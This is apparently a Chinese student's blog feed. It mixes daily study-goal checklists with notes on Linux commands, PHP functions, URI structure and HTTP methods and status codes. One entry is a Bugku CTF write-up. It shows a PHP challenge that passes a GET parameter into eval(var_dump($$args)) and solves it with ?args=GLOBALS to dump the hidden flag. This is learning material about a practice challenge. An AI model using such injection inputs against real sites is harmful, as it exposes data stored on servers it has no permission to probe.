    <content><![CDATA[<h2 id="2020-02-01目标"><a href="#2020-02-01目标" class="headerlink" title="2020-02-01目标"></a>2020-02-01目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第8章看完    </li>
<li>做一道ctf杂项题    </li>
<li>b站web基础和sql注入看完</li>
</ol>
<h2 id="2020-01-31总结"><a href="#2020-01-31总结" class="headerlink" title="2020-01-31总结"></a>2020-01-31总结</h2><p>晚上稍稍有些分心，其他时间OK，第一次用ssr翻了墙，看了YouTube。</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第7章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站ctf linux基础看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>linux基础操作</title>
    <url>/2020/01/31/linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="创建，删除，修改"><a href="#创建，删除，修改" class="headerlink" title="创建，删除，修改"></a>创建，删除，修改</h2><blockquote>
<p>touch file</p>
</blockquote>
<p>创建文件、</p>
<p><strong>若要使文件名中包含空格则用 “\ “</strong></p>
<blockquote>
<p>mkdir dir</p>
</blockquote>
<p>创建目录</p>
<blockquote>
<p>rm [option]</p>
</blockquote>
<p>option值：</p>
<ol>
<li>-i   确认是否删除</li>
<li>-r   删除目录时使用</li>
<li>-f   强制删除</li>
</ol>
<blockquote>
<p>mv [option] file dst</p>
</blockquote>
<ol>
<li>dst仅是文件名，代表重命名</li>
<li>dst是目录名，代表移动file到目录里</li>
<li>dst是目录和文件名，代表移动和重命名</li>
</ol>
<p>如:</p>
<blockquote>
<p>mv file1 abc/file2</p>
</blockquote>
<p>代表把file1移动到abc目录下并重命名为file2</p>
<blockquote>
<p>cp [option] src dst</p>
</blockquote>
<p>复制文件到某个目录</p>
<h2 id="移动路径"><a href="#移动路径" class="headerlink" title="移动路径"></a>移动路径</h2><blockquote>
<p>cd   dir</p>
</blockquote>
<p>移动路径</p>
<blockquote>
<p>cd   ..</p>
</blockquote>
<p>移动到父目录</p>
<blockquote>
<p>cd   ../..</p>
</blockquote>
<p>移动到父目录的父目录</p>
<blockquote>
<p>pwd</p>
</blockquote>
<p>显示当前所在的工作目录</p>
<blockquote>
<p>ls   [option] [dir]</p>
</blockquote>
<p>option值</p>
<ol>
<li>-a   显示所有文件（包括隐藏文件）</li>
<li>-l   显示文件或目录的详细信息</li>
<li>-d   显示当前目录本身属性，而不是目录内容（配合-l使用）</li>
<li>-i   显示文件或目录的indoes （配合-l使用，一目了然）</li>
</ol>
<h2 id="文本查看及相关操作"><a href="#文本查看及相关操作" class="headerlink" title="文本查看及相关操作"></a>文本查看及相关操作</h2><blockquote>
<p>cat file</p>
</blockquote>
<p>显示文件所有内容</p>
<blockquote>
<p>less file</p>
</blockquote>
<p>分页显示文件内容</p>
<blockquote>
<p>head/tail file</p>
</blockquote>
<p>显示文件的首尾行（默认为10行）</p>
<blockquote>
<p>tail -num file </p>
<p>显示文件file末尾num行</p>
</blockquote>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim file</span><br></pre></td></tr></table></figure>

<p>进入file的命令模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i</span><br></pre></td></tr></table></figure>

<p>进入insert模式</p>
<p>退出到命令模式点左上角“esc”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:wq(!)</span><br></pre></td></tr></table></figure>

<p>(强制)保存并删除</p>
<p><img src="/2020/01/31/linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/1.png" alt="1"></p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-31日目标</title>
    <url>/2020/01/30/2020-01-31%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-31目标"><a href="#2020-01-31目标" class="headerlink" title="2020-01-31目标"></a>2020-01-31目标</h2><ol>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>2-3篇数学通识</li>
<li>HTTP协议第7章看完</li>
<li>做一道ctf杂项题</li>
<li>b站ctflinux基础看完</li>
</ol>
<h2 id="2020-01-30总结"><a href="#2020-01-30总结" class="headerlink" title="2020-01-30总结"></a>2020-01-30总结</h2><p>下午状态略差，其余时间还OK</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP协议第6章看完</td>
<td>Y</td>
</tr>
<tr>
<td>b站ctf密码学看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>N</td>
</tr>
<tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-30日目标</title>
    <url>/2020/01/29/2020-01-30%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-30目标"><a href="#2020-01-30目标" class="headerlink" title="2020-01-30目标"></a>2020-01-30目标</h2><ol>
<li>HTTP协议第6章看完</li>
<li>b站ctf密码学看完</li>
<li>做一道ctf杂项题</li>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>2-3篇数学通识</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02月目标 [寒假目标]</title>
    <url>/2020/01/29/2020-02%E6%9C%88%E7%9B%AE%E6%A0%87-%E5%AF%92%E5%81%87%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="学习时间"><a href="#学习时间" class="headerlink" title="学习时间"></a>学习时间</h2><ol>
<li>早上：10:00-12:00</li>
<li>下午：时间不定，共两小时</li>
<li>晚上：19:00-22:00</li>
</ol>
<h2 id="每日完成的小杂项"><a href="#每日完成的小杂项" class="headerlink" title="每日完成的小杂项"></a>每日完成的小杂项</h2><ol>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>数学通识50讲</li>
</ol>
<h2 id="大块目标"><a href="#大块目标" class="headerlink" title="大块目标"></a>大块目标</h2><ol>
<li>看完HTTP协议</li>
<li>预习下学期的C语言</li>
<li>b站ctf介绍看完</li>
<li>白帽子讲信息安全带着看掉</li>
<li>带着做一些ctf题目</li>
<li>学python</li>
</ol>
]]></content>
      <categories>
        <category>月目标</category>
      </categories>
  </entry>
  <entry>
    <title>php var_dump()函数 [输出变量具体信息]</title>
    <url>/2020/01/28/php-var-dump-%E5%87%BD%E6%95%B0-%E8%BE%93%E5%87%BA%E5%8F%98%E9%87%8F%E5%85%B7%E4%BD%93%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($expression)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><strong>例1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(1, 2, array(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;));</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  int(2)</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  array(3) &#123;</span><br><span class="line">    [0]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;a&quot;</span><br><span class="line">    [1]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;b&quot;</span><br><span class="line">    [2]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;c&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>例2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b &#x3D; 3.1;</span><br><span class="line">$c &#x3D; true;</span><br><span class="line">var_dump($b, $c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float(3.1)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 变量1</title>
    <url>/2020/01/28/bugku-%E5%8F%98%E9%87%8F1/</url>
    <content><![CDATA[<h2 id="题目：变量1"><a href="#题目：变量1" class="headerlink" title="题目：变量1"></a>题目：<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">变量1</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<ol>
<li><p>error_reporting() 函数规定报告哪个错误。</p>
<p>而error_reporting(0) 表示关闭php错误显示。</p>
</li>
<li><p>用<a href="https://www.runoob.com/php/php-includes.html" target="_blank" rel="noopener">include</a>语句引入flag1.php文件，而flag应该就在里面</p>
</li>
<li><p>highlight_file()函数显示括号中文件的源代码</p>
</li>
<li><p>$_GET变量用来收集上传数据，具体方法为在网页域名后“?(要上传的数据)”</p>
</li>
<li><p>“/^\w+$/“该正则表达式代表$args变量要符合至少一个（0-9/a-z/A-Z）组成的字符串</p>
</li>
<li><p>要显示flag1.php里的值，尝试使用超级全局变量<strong>$GLOBALS</strong>($GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。)</p>
</li>
<li><p>var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
</li>
</ol>
<p>所以在域名后加“ ?args=GLOBALS ”,</p>
]]></content>
      <categories>
        <category>ctf总结</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>php is_numeric()函数 [检测变量是否为数字或数字字符串]</title>
    <url>/2020/01/28/php-is-numeric-%E5%87%BD%E6%95%B0-%E6%A3%80%E6%B5%8B%E5%8F%98%E9%87%8F%E6%98%AF%E5%90%A6%E4%B8%BA%E6%95%B0%E5%AD%97%E6%88%96%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is _numeric()"></a>is _numeric()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>检测变量是否为数字或数字字符串</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_numeric( &amp;var )</span><br></pre></td></tr></table></figure>

<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$var_name1&#x3D;678;</span><br><span class="line">$var_name2&#x3D;&quot;a678&quot;;</span><br><span class="line">$var_name3&#x3D;&quot;678&quot;;</span><br><span class="line">$var_name4&#x3D;&quot;runoob.com&quot;;</span><br><span class="line">$var_name5&#x3D;698.99;</span><br><span class="line">$var_name6&#x3D;array(&quot;a1&quot;,&quot;a2&quot;);</span><br><span class="line">$var_name7&#x3D;+125689.66;</span><br><span class="line">if (is_numeric($var_name1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name1 是数字&quot; . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name1 不是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line">if (is_numeric($var_name2))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name2 是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name2 不是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$result&#x3D;is_numeric($var_name3);</span><br><span class="line">echo &quot;[ $var_name3 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name4);</span><br><span class="line">echo &quot;[ $var_name4 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name5);</span><br><span class="line">echo &quot;[ $var_name5 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name6);</span><br><span class="line">echo &quot;[ $var_name6 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name7);</span><br><span class="line">echo &quot;[ $var_name7 是数字吗? ]&quot; .var_dump($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">678 是数字</span><br><span class="line">a678 不是数字</span><br><span class="line">[ 678 是数字吗? ]</span><br><span class="line">bool(true)</span><br><span class="line">[ runoob.com 是数字吗? ]</span><br><span class="line">bool(false)</span><br><span class="line">[ 698.99 是数字吗? ]</span><br><span class="line">bool(true)</span><br><span class="line">[ Array 是数字吗? ]</span><br><span class="line">bool(false)</span><br><span class="line">[ 125689.66 是数字吗? ]</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>URI格式</title>
    <url>/2020/01/25/URI%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/7.png" alt="7"></p>
<p>使用 http: 或 https: 等协议方案名获取访问资源时要指定协议类型。不 区分字母大小写，最后附一个冒号（:）。 也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。</p>
<h3 id="登录信息（认证）"><a href="#登录信息（认证）" class="headerlink" title="登录信息（认证）"></a>登录信息（认证）</h3><p>指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份 认证）。此项是<strong><em>可选项</em></strong>。</p>
<h3 id="服务器地址"><a href="#服务器地址" class="headerlink" title="服务器地址"></a>服务器地址</h3><p>使用绝对 URI 必须指定待访问的服务器地址。地址可以是类似 hackr.jp 这种 DNS 可解析的名称，或是 192.168.1.1 这类 IPv4 地址 名，还可以是 [0:0:0:0:0:0:0:1] 这样用方括号括起来的 IPv6 地址名。</p>
<h3 id="服务器端口号"><a href="#服务器端口号" class="headerlink" title="服务器端口号"></a>服务器端口号</h3><p>指定服务器连接的网络端口号。此项也是<strong><em>可选项</em></strong>，若用户省略则自动 使用默认端口号。</p>
<h3 id="带层次的文件路径"><a href="#带层次的文件路径" class="headerlink" title="带层次的文件路径"></a>带层次的文件路径</h3><p>指定服务器上的文件路径来定位特指的资源。这与 UNIX 系统的文件 目录结构相似。</p>
<h3 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h3><p>针对已指定的文件路径内的资源，可以使用查询字符串传入任意参 数。此项<strong><em>可选</em></strong>。</p>
<h3 id="片段标识符"><a href="#片段标识符" class="headerlink" title="片段标识符"></a>片段标识符</h3><p>使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个 位置）。但在 RFC 中并没有明确规定其使用方法。该项也为可选 项。</p>
]]></content>
  </entry>
  <entry>
    <title>HTTP协议</title>
    <url>/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="与HTTP有关的协议"><a href="#与HTTP有关的协议" class="headerlink" title="与HTTP有关的协议"></a>与HTTP有关的协议</h1><p>先通过一张图大致了解一下http协议与相关协议之间的关系：</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p>
<h2 id="DNS服务（域名解析）"><a href="#DNS服务（域名解析）" class="headerlink" title="DNS服务（域名解析）"></a>DNS服务（域名解析）</h2><p>DNS 协议提供通过域名 查找 IP 地址，或逆向从 IP 地址反查域名的服务。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p>
<h2 id="TCP协议（位于传输层）"><a href="#TCP协议（位于传输层）" class="headerlink" title="TCP协议（位于传输层）"></a>TCP协议（位于传输层）</h2><ol>
<li>为了方便传输，TCP协议将 大块数据 分割以 报文段（segment）。</li>
<li>为了确保数据能准确无误地送达，TCP协议采用三次握手策略，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p>
<h2 id="IP协议（位于网络层）"><a href="#IP协议（位于网络层）" class="headerlink" title="IP协议（位于网络层）"></a>IP协议（位于网络层）</h2><p>IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网 （LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转 才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address Resolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方 的 IP 地址就可以反查出对应的 MAC 地址。<br>没有人能够全面掌握互联网中的传输状况<br>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只 能获悉很粗略的传输路线。<br>这种机制称为路由选择（routing），有点像快递公司的送货过程。想 要寄快递的人，只要将自己的货物送到集散中心，就可以知道快递公 司是否肯收件发货，该快递公司的集散中心检查货物的送达地址，明 确下站该送往哪个区域的集散中心。接着，那个区域的集散中心自会 判断是否能送到对方的家中。<br>我们是想通过这个比喻说明，无论哪台计算机、哪台网络设备，它们 都无法全面掌握互联网中的细节。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>
<h1 id="HTTP协议基本信息"><a href="#HTTP协议基本信息" class="headerlink" title="HTTP协议基本信息"></a>HTTP协议基本信息</h1><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/8.png" alt="8"></p>
<ol>
<li><p>用于客户端和服务器端的通信。</p>
</li>
<li><p>通过请求和响应的交换达成通信。</p>
</li>
<li><p>HTTP 是一种不保存状态，即无状态（stateless）协议。</p>
</li>
<li><p>HTTP 协议使用 <a href="http://albatross-g.site/2020/01/25/URI格式/" target="_blank" rel="noopener">URI</a> 定位互联网上的资源。</p>
<p>当客户端请求访问资源而发送请求时，URI 需要将作为请求报文中的 请求 URI 包含在内。指定请求 URI 的方式有很多。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/9.png" alt="9"></p>
</li>
<li><p>HTTP协议使用持久连接。。持久连接的特点是，只要任意一端 没有明确提出断开连接，则保持 TCP 连接状态。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/10.png" alt="10"></p>
</li>
<li><p>持久连接使得多数请求以管线化（pipelining）方式发送成为可能。管线化技术 出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待 响应了。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/11.png" alt="11"></p>
</li>
<li><p>不可否认，无状态协议当然有它的优点。由于不必保存状态，自然 可减少服务器的 CPU 及内存资源的消耗。但面对需要保存的状况又会产生一定麻烦，于是引入了cookie技术。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/12.png" alt="12"></p>
</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/13.png" alt="13"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/14.png" alt="14"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/15.png" alt="15"></p>
<h1 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h1><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/19.png" alt="19"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/16.png" alt="16"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/17.png" alt="17"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/20.png" alt="20"></p>
<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/18.png" alt="18"></p>
<h3 id="GET方法（获取-访问资源）"><a href="#GET方法（获取-访问资源）" class="headerlink" title="GET方法（获取/访问资源）"></a>GET方法（获取/访问资源）</h3><p>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/21.png" alt="21"></p>
<h3 id="POST方法（传输实体主体）"><a href="#POST方法（传输实体主体）" class="headerlink" title="POST方法（传输实体主体）"></a>POST方法（传输实体主体）</h3><p>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/22.png" alt="22"></p>
<h3 id="PUT方法（传输文件）"><a href="#PUT方法（传输文件）" class="headerlink" title="PUT方法（传输文件）"></a>PUT方法（传输文件）</h3><p>PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。</p>
<p>但是，鉴于 HTTP/1.1 的 PUT 方法自身不带验证机制，任何人都可以 上传文件 , 存在安全性问题，因此一般的 Web 网站不使用该方法。若 配合 Web 应用程序的验证机制，或架构设计采用 REST（REpresentational State Transfer，表征状态转移）标准的同类 Web 网站，就可能会开放使用 PUT 方法。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/23.png" alt="23"></p>
<h3 id="HEAD方法（获取报文头部）"><a href="#HEAD方法（获取报文头部）" class="headerlink" title="HEAD方法（获取报文头部）"></a>HEAD方法（获取报文头部）</h3><p>HEAD 方法和 GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/24.png" alt="24"></p>
<h3 id="DELETE方法（删除文件）"><a href="#DELETE方法（删除文件）" class="headerlink" title="DELETE方法（删除文件）"></a>DELETE方法（删除文件）</h3><p>DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。 </p>
<p>但是，HTTP/1.1 的 DELETE 方法本身和 PUT 方法一样不带验证机 制，所以一般的 Web 网站也不使用 DELETE 方法。当配合 Web 应用 程序的验证机制，或遵守 REST 标准时还是有可能会开放使用的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/25.png" alt="25"></p>
<h3 id="OPTIONS方法（询问支持的办法）"><a href="#OPTIONS方法（询问支持的办法）" class="headerlink" title="OPTIONS方法（询问支持的办法）"></a>OPTIONS方法（询问支持的办法）</h3><p>OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/26.png" alt="26"></p>
<h3 id="TRACE方法（追踪路径）"><a href="#TRACE方法（追踪路径）" class="headerlink" title="TRACE方法（追踪路径）"></a>TRACE方法（追踪路径）</h3><p>TRACE 方法是让 Web 服务器端将之前的请求通信环回给客户端的方 法。</p>
<p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/27.png" alt="27"></p>
<h3 id="CONNECT方法（要求用隧道协议链接代理）"><a href="#CONNECT方法（要求用隧道协议链接代理）" class="headerlink" title="CONNECT方法（要求用隧道协议链接代理）"></a>CONNECT方法（要求用隧道协议链接代理）</h3><p>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/28.png" alt="28"></p>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/29.png" alt="29"></p>
<h3 id="2XX-成功（2XX-的响应结果表明请求被正常处理了。-）"><a href="#2XX-成功（2XX-的响应结果表明请求被正常处理了。-）" class="headerlink" title="2XX 成功（2XX 的响应结果表明请求被正常处理了。 ）"></a>2XX 成功（2XX 的响应结果表明请求被正常处理了。 ）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/30.png" alt="30"></p>
<p>表示从客户端发来的请求在服务器端被正常处理了。<br>在响应报文内，随状态码一起返回的信息会因方法的不同而发生改 变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返 回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体 作为响应返回（即在响应中只返回首部，不会返回实体的主体部 分）。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/31.png" alt="31"></p>
<p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中 不含实体的主体部分。另外，也不允许返回任何实体的主体。比如， 当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面 不发生更新。<br>一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/32.png" alt="32"></p>
<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。 </p>
<h3 id="3XX-重定向（3XX-响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）"><a href="#3XX-重定向（3XX-响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）" class="headerlink" title="　3XX 重定向（3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）"></a>　3XX 重定向（3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/33.png" alt="33"></p>
<p><strong>永久性重定向。</strong>该状态码表示请求的资源已被分配了新的 URI，以后 应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</p>
<p>像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠“/”，就 会产生 301 状态码。</p>
<blockquote>
<p><a href="http://example.com/sample" target="_blank" rel="noopener">http://example.com/sample</a></p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/34.png" alt="34"></p>
<p><strong>临时性重定向。</strong>该状态码表示请求的资源已被分配了新的 URI，希望 用户（本次）能使用新的 URI 访问。 </p>
<p>和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会 像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码 的页面对应的 URI。 </p>
